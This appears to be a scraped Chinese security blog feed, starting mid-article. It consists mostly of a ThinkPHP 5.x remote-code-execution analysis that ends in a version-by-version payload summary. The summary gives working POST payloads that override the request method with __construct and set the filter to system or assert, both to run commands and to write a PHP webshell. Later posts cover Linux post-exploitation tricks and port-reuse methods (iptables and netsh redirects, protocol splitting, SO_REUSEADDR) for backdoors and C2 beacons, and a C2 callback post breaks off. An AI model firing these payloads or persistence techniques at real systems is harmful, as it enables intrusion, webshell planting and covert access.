mathvariant="normal">分</mi><mi mathvariant="normal">析</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">获</mi><mi mathvariant="normal">取</mi></mrow><annotation encoding="application/x-tex">rules这里，在高版本做了判断处理，低版本没有值会数组越界，分析一下获取</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">高</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">做</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">低</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mord cjk_fallback">没</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">越</span><span class="mord cjk_fallback">界</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">析</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span></span></span></span>method值的部分</p><p><img src="../../../typora-user-images/image-20240813182615250.png" alt="image-20240813182615250" /></p><p>跟进去，这里的方法在我们上面已经分析过了，是漏洞的触发点，会走到第一个框内的逻辑，然后传入construct对Request类的属性进行覆盖。我们看一下函数的返回值，发现返回的this-&gt;method，我们上面已经可以进行覆盖了，所以这里可以选择在post body中覆盖method，这样就不会数组越界了。</p><p><img src="../../../typora-user-images/image-20240815110124941.png" alt="image-20240815110124941" /></p><p>rules数组存在如下key值，保证不越界即可。</p><p><img src="../../../typora-user-images/image-20240815111159943.png" alt="image-20240815111159943" /></p><p>因此随便选择一个值赋值即可。</p><p>最终payload:</p><p><strong>aaaaa</strong>=<strong>calc</strong>&amp;<strong>_method</strong>=<strong>__construct</strong>&amp;<strong>filter</strong>[]=<strong>system</strong>&amp;<strong>method</strong>=<strong>name</strong></p><p><img src="../../../typora-user-images/image-20240815111449636.png" alt="image-20240815111449636" /></p><h4 id="tp-508version5012"><a class="markdownIt-Anchor" href="#tp-508version5012"></a> TP 5.0.8&lt;=version&lt;=5.0.12</h4><p>这个我们最初的例子就是5.0.12的，因此不过多赘述。</p><h4 id="tp-5013version-5116"><a class="markdownIt-Anchor" href="#tp-5013version-5116"></a> TP 5.0.13&lt;=version&lt;= 5.1.16</h4><p>搭起来5.0.14的环境，使用5.0.12的payload，debug看一下过程</p><p>发现最终触发点的$filter没有赋值到。</p><p><img src="../../../typora-user-images/image-20240815143328858.png" alt="image-20240815143328858" /></p><p>看一下5.0.13和5.0.5的diff</p><p><a href="https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3">https://github.com/top-think/framework/compare/v5.0.5...v5.0.13#diff-d86cf2606459bf4da21b7c3a1f7191f3</a></p><p>在上面的漏洞分析流程中，找到可能更新了filter的地方。如下图，更新了filter。</p><p><img src="../../../typora-user-images/image-20240815142514799.png" alt="image-20240815142514799" /></p><p>在对应位置打个断点，此时我们传入的filter已经覆盖为Request类的filter属性</p><p><img src="../../../typora-user-images/image-20240815145706757.png" alt="image-20240815145706757" /></p><p>这个方法跟入就是覆盖filter的方法。而参数$config[‘default_filter’]为空，也就将我们传入的system覆盖为空了，也就导致无法执行5.0.12版本的payload。</p><p><img src="../../../typora-user-images/image-20240815145848660.png" alt="image-20240815145848660" /></p><p>那么想办法让逻辑不进入图中的方法，寻找其他触发点：</p><ol><li>我们上面分析过，当开启debug时，可以走另一套触发逻辑。</li><li>寻找其他触发位置，且触发位置不能在上面的module方法后面，必须在前面</li></ol><p>我们寻找一下上面的module方法。是一套switch逻辑，我们看一下能否走入controller和method逻辑</p><p><img src="../../../typora-user-images/image-20240815150437594.png" alt="image-20240815150437594" /></p><p>图中的是ThinkPHP不同的路由方式，具体如下：<a href="https://www.kancloud.cn/manual/thinkphp5/118037">https://www.kancloud.cn/manual/thinkphp5/118037</a></p><p>我们要进入的是方法3和方法4，接下来就是寻找TP代码在定义路由时，是否有对应的定义方式。</p><p><img src="../../../typora-user-images/image-20240815171134142.png" alt="image-20240815171134142" /></p><p>看一下<strong>TP完整版</strong>的composer配置，发现会自动安装很多模块。(为了漏洞复现的话，也可以直接配置&quot;topthink/think-captcha&quot;: “^1.0”)</p><p><img src="../../../typora-user-images/image-20240815112918572.png" alt="image-20240815112918572" /></p><p>TP在初始化时，存在自动类加载机制，将 <strong>vendor</strong> 目录下的文件加载，因此会存在captcha路由。（完整版会默认存在此路由）</p><p>下图中我们发现注册了一个get的、路由到类的方法，符合我们的漏洞触发点。</p><p><img src="../../../typora-user-images/image-20240807174519099.png" alt="image-20240807174519099" /></p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?s&#x3D;&#x2F;captcha&amp;XDEBUG_SESSION_START&#x3D;18306 HTTP&#x2F;1.1Host: tp5014Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36aaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们拿上面分析好payload加上captcha路由测试一下，测试后发现没有成功，我们回到定义路由的地方发现路由定义的是get方式，因此无法找到最终的定义规则很正常。我们跟回代码。</p><p>这里的rule数据包含着路由规则，get存储着我们想利用的captcha路由，这里与上面的思路类似，$method是可控的，因此把他修改为get就可以了</p><p><img src="../../../typora-user-images/image-20240815172003658.png" alt="image-20240815172003658" /></p><p><img src="../../../typora-user-images/image-20240815172143487.png" alt="image-20240815172143487" /></p><h4 id="tp-5117-version-5132"><a class="markdownIt-Anchor" href="#tp-5117-version-5132"></a> TP 5.1.17&lt;= version &lt;= 5.1.32</h4><p>高版本的代码有变化， 低版本可以使用construct调用方法，高版本直接改成赋值了。</p><p>也就是说，我们无法对Request类的任意属性进行覆盖了。</p><p><img src="../../../typora-user-images/image-20240815173008272.png" alt="image-20240815173008272" /></p><p>开一下debug，发现提示无键值。</p><p><img src="../../../typora-user-images/image-20240815175017161.png" alt="image-20240815175017161" /></p><p>找到触发位置，这里与上面调试遇见的问题类似，不过这里无法进行覆盖了。</p><p><img src="../../../typora-user-images/image-20240815174828864.png" alt="image-20240815174828864" /></p><p><img src="../../../typora-user-images/image-20240815174841800.png" alt="image-20240815174841800" /></p><h5 id="理论中的利用方法"><a class="markdownIt-Anchor" href="#理论中的利用方法"></a> 理论中的利用方法</h5><p><a href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p><p>这篇文章提出了一个理论方法，但是本地未复现出，实战意义也有限，仅当拓展。</p><h2 id="4payload汇总-2"><a class="markdownIt-Anchor" href="#4payload汇总-2"></a> 4.Payload汇总</h2><h3 id="tp-500v507"><a class="markdownIt-Anchor" href="#tp-500v507"></a> TP 5.0.0&lt;=V&lt;=5.0.7</h3><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F;写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="tp-508v5012"><a class="markdownIt-Anchor" href="#tp-508v5012"></a> TP 5.0.8&lt;=V&lt;=5.0.12</h3><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoamic&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-POST" data-language="POST"><code class="language-POST">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F;写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="tp-5013v-5116"><a class="markdownIt-Anchor" href="#tp-5013v-5116"></a> TP 5.0.13&lt;=V&lt;= 5.1.16</h3><p>需要开启debug：</p><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;index&#x2F;indexs&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;systemaaaa&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoamic&#x3D;system&amp;f&#x3D;calc&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">POSTs&#x3D;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method&#x3D;__construct&amp;method&#x3D;POST&amp;filter[]&#x3D;assert&#x2F;&#x2F; 写shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>完整版存在captcha路由的情况：</p><pre class="line-numbers language-none"><code class="language-none">POST ?s&#x3D;captchaaaaa&#x3D;calc&amp;_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="tp-5117-v-5132"><a class="markdownIt-Anchor" href="#tp-5117-v-5132"></a> TP 5.1.17&lt;= V&lt;= 5.1.32</h3><p>理论的利用方法：（未验证过）</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;c&#x3D;exec&amp;f&#x3D;calc.exe&amp;_method&#x3D;filter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://todis21.github.io/2023/07/08/ThinkPHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">https://todis21.github.io/2023/07/08/ThinkPHP-代码审计/</a></p><p><a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">https://www.cnblogs.com/lingzhisec/p/15728886.html</a></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://xz.aliyun.com/t/6106">https://xz.aliyun.com/t/6106</a></p><p><a href="https://y4er.com/posts/thinkphp5-rce/">https://y4er.com/posts/thinkphp5-rce/</a></p><p><a href="https://www.cnblogs.com/wkzb/p/14156026.html">https://www.cnblogs.com/wkzb/p/14156026.html</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html">https://www.cnblogs.com/iamstudy/articles/thinkphp_5_x_rce_1.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-启&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-启&quot;&gt;&lt;/a&gt; 0x00 启&lt;/h1&gt;
&lt;p&gt;黑盒debug开启会报错出具体版本&lt;/p&gt;
&lt;p&gt;白盒看本地tp代码&lt;/p&gt;
&lt;p&gt;tp3 在目录的ThinkPHP文件</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>Linux后渗透研究--Linux特性利用和极限场景处理</title>
    <link href="https://cyxsec.github.io/2023/04/Linux%E5%90%8E%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6--Linux%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8%E5%92%8C%E6%9E%81%E9%99%90%E5%9C%BA%E6%99%AF%E5%A4%84%E7%90%86/"/>
    <id>https://cyxsec.github.io/2023/04/Linux%E5%90%8E%E6%B8%97%E9%80%8F%E7%A0%94%E7%A9%B6--Linux%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8%E5%92%8C%E6%9E%81%E9%99%90%E5%9C%BA%E6%99%AF%E5%A4%84%E7%90%86/</id>
    <published>2023-04-29T03:28:25.000Z</published>
    <updated>2024-07-22T08:47:26.263Z</updated>
    
    <content type="html"><![CDATA[<p>Linux渗透的时候要理解和接受一个概念：Linux一切皆文件</p><p><strong>简单记录一下渗透中利用的Linux特性、后渗透的极限场景处理</strong></p><p>Linux不同发行版有他们自己的特性，这些特性在渗透和后渗透中都可以用到</p><h2 id="0x01查看系统ip信息"><a class="markdownIt-Anchor" href="#0x01查看系统ip信息"></a> 0x01查看系统ip信息</h2><ul><li>阉割 ip a、ifconfig</li></ul><p>在<strong>非DHCP</strong>情况下，不同发行版在本地文件可以找到ip配置信息</p><p>RHEL/CentOS系</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-&lt;interface&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240429114106822.png" alt="image-20240429114106822" /></p><p>Debian系</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;network&#x2F;interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他：</p><ul><li>查看arp表</li><li>hostname -I</li><li>端口连接信息</li></ul><h2 id="0x02查看端口连接信息"><a class="markdownIt-Anchor" href="#0x02查看端口连接信息"></a> 0x02查看端口连接信息</h2><p>/proc/net 下面的tcp和udp文件会存储网络端口连接情况</p><p><img src="../../../typora-user-images/image-20240527102511919.png" alt="image-20240527102511919" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Linux渗透的时候要理解和接受一个概念：Linux一切皆文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;简单记录一下渗透中利用的Linux特性、后渗透的极限场景处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linux不同发行版有他们自己的特性，这些特性在渗透和后渗透中都可以用到&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
    <category term="后渗透" scheme="https://cyxsec.github.io/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>端口复用技术</title>
    <link href="https://cyxsec.github.io/2022/08/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%8A%80%E6%9C%AF/"/>
    <id>https://cyxsec.github.io/2022/08/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E6%8A%80%E6%9C%AF/</id>
    <published>2022-08-03T03:16:57.000Z</published>
    <updated>2024-07-22T08:44:46.829Z</updated>
    
    <content type="html"><![CDATA[<p>很多情况下遇到无法解析webshell环境（python之类的rce），或内网环境遇到强隔离，限定了通讯端口。</p><p>端口复用工作中用的不算太多，主要是考虑客户业务的稳定性，导致很多时候不太敢上端口复用。</p><p>端口复用根据不同场景有不同的实现方案，下面简单总结一下。</p><p><strong>具体的概念可以直接看这篇，讲的十分详细，在网上搜了很多篇， 感觉都是抄的这篇，写的确实好</strong>：<a href="http://mobile.51cto.com/hot-557084.html">http://mobile.51cto.com/hot-557084.html</a></p><h2 id="0x01基于端口转发协议分流的端口复用"><a class="markdownIt-Anchor" href="#0x01基于端口转发协议分流的端口复用"></a> 0x01基于端口转发+协议分流的端口复用</h2><p>配置过程大概是：</p><ul><li>使用分流工具，监听本地9999端口的流量，根据协议做分流区分，如正常的http协议依然按照正常的业务逻辑转发到80端口，其他我们指定的协议就可以转发到我们实际的利用端口，即可完成端口复用。</li></ul><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;Pandentia&#x2F;protoplex这是一个协议复用的工具，比如命令可将本地9999端口的流量根据协议类型转到本地的2333和80端口。注: 在实战环境中，先用protoplex进行分流，然后再进行重定向。.&#x2F;protoplex --socks5 192.168.154.130:2333 --http 127.0.0.1:80 -b 192.168.154.130:9999注: protoplex设置分流的http协议IP和重定向的ip不要设置为同一个ip,否则会形成闭环。同时该工具还支持其他协议的分流，如：    SSH    HTTP    TLS (&#x2F; HTTPS)    OpenVPN    SOCKS4 &#x2F; SOCKS5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>利用netsh（win）和iptables （Linux）配置端口转发策略，将请求服务器80端口的流量转发到本地的9999端口（对应监听即可）</p><pre class="line-numbers language-none"><code class="language-none">linux将访问80的流量重定向到9999端口sudo iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 9999windows将本地80流量重定向到9999netsh interface portproxy add v4tov4 listenport&#x3D;80 listenaddress&#x3D;192.168.154.129 connectport&#x3D;9999 connectaddress&#x3D;192.168.154.129<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大致过程如下：</p></li></ul><p><img src="../../../typora-user-images/image-20240704171847360.png" alt="image-20240704171847360" /></p><p>实战中有一些http的web，就可以设置https的上线beacon，通过此方式进行中转上线。</p><p><strong>yy一句，理论上不单单可以根据协议区分，协议只是一个比较明显的特征，区分不同的数据包，在协议相同的情况下也可以做到端口复用，是理论上的思路，没找到现成的工具</strong></p><h2 id="0x02基于httpsys-winrm-端口复用"><a class="markdownIt-Anchor" href="#0x02基于httpsys-winrm-端口复用"></a> 0x02基于HTTP.sys + Winrm 端口复用</h2><p>首先明确概念</p><p>HTTP.sys是iis的驱动，iis中不同应用可以使用相同的端口，这也是其驱动的工作原理，可以根据注册的URL前缀，将请求分发到不同应用，也就实现了端口复用。（其实和反向代理差不多）</p><p>Winrm服务，这个我们在内网渗透中用的比较多，这个服务在2012及其以后的机器默认开放，他本质上就是在<strong>HTTP.sys上注册了wsman的URL前缀，默认监听端口5985</strong>，所以也能理解为什么winrm默认走的http协议。</p><p>所以这个复用也就很好理解了，<em>配置好winrm，就能在web服务连接winrm服务。</em></p><p>这个复用最终的效果就是使用winrm服务，winrm服务的特点我们搞内网多也知道横向移动可以使用该端口认证执行命令（此过程无文件落地）。</p><p>目前能想到的应用点：</p><ul><li>横向移动/后门</li><li>应对极端环境下的渗透测试任务（防火墙策略配置很死、强终端对抗，如：无法落地文件</li></ul><p>理解整个利用过程，这里的winrm服务我们也能理解是个代指，winrm是windows自带的，我们实战一样可以自实现调用这种http.sys驱动机制的API接口，最终实现一个类winrm服务做后门。（webshell等，又回到了上面的正向HTTP隧道）</p><p>大概就是：<a href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp">https://github.com/3gstudent/Homework-of-C-Language/blob/master/UsePipeToExeCmd.cpp</a></p><p>三好学生写的是命令执行，那理论上应该也可以做正向http隧道？但目前没找到现成的工具，后面实战用到再考虑。</p><h2 id="0x03基于socket绑定特性的端口复用"><a class="markdownIt-Anchor" href="#0x03基于socket绑定特性的端口复用"></a> 0x03基于socket绑定特性的端口复用</h2><p>我们知道，一般来说在我们启动一个新的端口，如果当前端口已被占用，就会出现以下错误。</p><pre class="line-numbers language-none"><code class="language-none">Error: listen tcp 127.0.0.1:8080: bind: Only one usage of each socket address (protocol&#x2F;network address&#x2F;port) is normally permitted.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在缺省条件下，一个套接口不能与一个已在使用中的本地地址捆绑（bind())）。但有时会需要“重用”地址。因为每一个连接都由本地地址和远端地址的组合唯一确定，所以只要远端地址不同，两个套接口与一个地址捆绑并无大碍。为了通知套接口实现不要因为一个地址已被一个套接口使用就不让它与另一个套接口捆绑。</p><p>然而，根据TCP/IP标准，端口本身是允许复用的。绑定端口的本质是，当系统接收到一个TCP报文段或UDP数据报时，可以根据其头部的端口字段找到对应的进程，并将数据传递给相应的进程。多个业务共用同一个端口的情况下其实很常见</p><p>在这个背景下，<code>SO_REUSEPORT</code> 和 <code>SO_REUSEADDR</code> 是两个套接字选项，它们允许在特定情况下重新使用端口：</p><ul><li><strong>SO_REUSEPORT：</strong> 允许多个套接字同时绑定到相同的地址和端口，可以同时接收传入的连接，适用于实现负载均衡或者多进程/线程同时监听同一端口的场景。</li><li><strong>SO_REUSEADDR：</strong> 允许在一个套接字使用过程中被终止后，其他套接字可以立即再次绑定到相同的地址和端口，有助于在服务器重启后快速恢复服务。</li></ul><p>我们在建立socket连接时，指定好这两个参数，就可以重新使用已经绑定的端口，完成端口复用了。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> lc <span class="token operator">=</span> net<span class="token punctuation">.</span>ListenConfig<span class="token punctuation">&#123;</span>Control<span class="token punctuation">:</span> <span class="token keyword">func</span><span class="token punctuation">(</span>network<span class="token punctuation">,</span> address <span class="token builtin">string</span><span class="token punctuation">,</span> c syscall<span class="token punctuation">.</span>RawConn<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> opErr <span class="token builtin">error</span><span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Control</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>fd <span class="token builtin">uintptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>opErr <span class="token operator">=</span> windows<span class="token punctuation">.</span><span class="token function">SetsockoptInt</span><span class="token punctuation">(</span>windows<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">,</span> windows<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> windows<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token keyword">return</span> opErr<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>缺点：iis无法复用（iis5以下可以，可以考虑使用上面HTTP.sys的方法）、3389无法复用（RDP可以考虑采用隧道方式：<a href="https://github.com/nccgroup/SocksOverRDP%EF%BC%89">https://github.com/nccgroup/SocksOverRDP）</a></p><h3 id="socket复用技术缺点"><a class="markdownIt-Anchor" href="#socket复用技术缺点"></a> socket复用技术缺点</h3><p>理论很丰满，现实众是否真的这么简单呢？</p><p>我们设置socket的SO_REUSEADDR参数并不一定其作用</p><ul><li>程序编写人员 socket 在绑定前需要使用 setsockopt 指定 SO_EXCLUSIVEADDRUSE   要求独占所有的端口地址，而不允许复用。这样其它人就无法复用这个端口了，即使你设置了 socket 为 SO_REUSEADDR   也没有用，程序根本跑不起来。</li><li>iis无法复用</li></ul><p><img src="../../../typora-user-images/image-20240715154737649.png" alt="image-20240715154737649" /></p><h2 id="0x04基于驱动的端口复用"><a class="markdownIt-Anchor" href="#0x04基于驱动的端口复用"></a> 0x04基于驱动的端口复用</h2><p>使用驱动程序进行端口复用和转发：</p><p><a href="https://github.com/Arno0x/DivertTCPconn">https://github.com/Arno0x/DivertTCPconn</a></p><p><a href="https://github.com/praetorian-inc/PortBender">https://github.com/praetorian-inc/PortBender</a></p><p>原理之后有精力再去分析</p><h2 id="0x05-参考连接"><a class="markdownIt-Anchor" href="#0x05-参考连接"></a> 0x05 参考连接：</h2><p>（frsocks+protoplex+流量重定向实现端口复用）<a href="https://uknowsec.cn/posts/notes/frsocks+protoplex+%E6%B5%81%E9%87%8F%E9%87%8D%E5%AE%9A%E5%90%91%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.html">https://uknowsec.cn/posts/notes/frsocks+protoplex+流量重定向实现端口复用.html</a></p><p>（一条命令实现端口复用后门）<a href="https://paper.seebug.org/1004/">https://paper.seebug.org/1004/</a></p><p>（利用IIS的端口共享功能绕过防火墙）<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8IIS%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%85%B1%E4%BA%AB%E5%8A%9F%E8%83%BD%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99">https://3gstudent.github.io/利用IIS的端口共享功能绕过防火墙</a></p><p>（探索基于HTTP.SYS实现权限维持）<a href="https://c1y2m3.github.io/2019/11/21/%E6%8E%A2%E7%B4%A2%E5%9F%BA%E4%BA%8EHTTP.SYS%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">https://c1y2m3.github.io/2019/11/21/探索基于HTTP.SYS实现权限维持/</a></p><p><a href="https://github.com/p1d3er/port_reuse">https://github.com/p1d3er/port_reuse</a></p><p>（聊聊端口复用的实现和坑点）<a href="http://mobile.51cto.com/hot-557084.html">http://mobile.51cto.com/hot-557084.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;很多情况下遇到无法解析webshell环境（python之类的rce），或内网环境遇到强隔离，限定了通讯端口。&lt;/p&gt;
&lt;p&gt;端口复用工作中用的不算太多，主要是考虑客户业务的稳定性，导致很多时候不太敢上端口复用。&lt;/p&gt;
&lt;p&gt;端口复用根据不同场景有不同的实现方案，下面简单</summary>
      
    
    
    
    
    <category term="端口复用" scheme="https://cyxsec.github.io/tags/%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>不出网C2上线</title>
    <link href="https://cyxsec.github.io/2022/07/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFC2/"/>
    <id>https://cyxsec.github.io/2022/07/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BFC2/</id>
    <published>2022-07-05T03:16:57.000Z</published>
    <updated>2024-07-22T08:44:45.466Z</updated>
    
    <content type="html"><![CDATA[<p>先简单带一下常见的正向HTTP隧道</p><h2 id="0x01正向http隧道"><a class="markdownIt-Anchor" href="#0x01正向http隧道"></a> 0x01正向HTTP隧道</h2><p>这种方式应用范围很广，有webshell的情况下都支持此方式</p><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><p>页面上存在成熟的工具Reg、NeoReg、suo5等</p><p>原理大概如下图所示：（这里直接拿Viper作者的图来说了）</p><p><img src="../../../typora-user-images/image-20240709180051975.png" alt="image-20240709180051975" /></p><ul><li><p>client运行在互联网的vps上，开启端口监听处理proxychains转发的tcp连接。（client对应的就是reg的本地python脚本和suo5的客户端）</p></li><li><p>clinet从tcp连接中读取数据，将数据存储在post请求中发送到webshell。</p></li><li><p>webshell将http请求解析并进行转发。（webshell集成了上图中的server)</p></li></ul><p>suo5其实实现了基本全双工的模式，这个问题后面有空再研究。</p><h2 id="0x02不出网上线cs场景"><a class="markdownIt-Anchor" href="#0x02不出网上线cs场景"></a> 0x02不出网上线CS场景</h2><p>CS的beacon只能反向连接，不出网的情况下无法直接反向连接外网vps</p><p>其实也可以利用中转的方式进行上线</p><h3 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h3><p>成熟的工具：pystinger（毒刺）</p><p>原理大概如下图所示：（这里直接拿Viper作者的图来说了）</p><p><img src="../../../typora-user-images/image-20240709180109508.png" alt="image-20240709180109508" 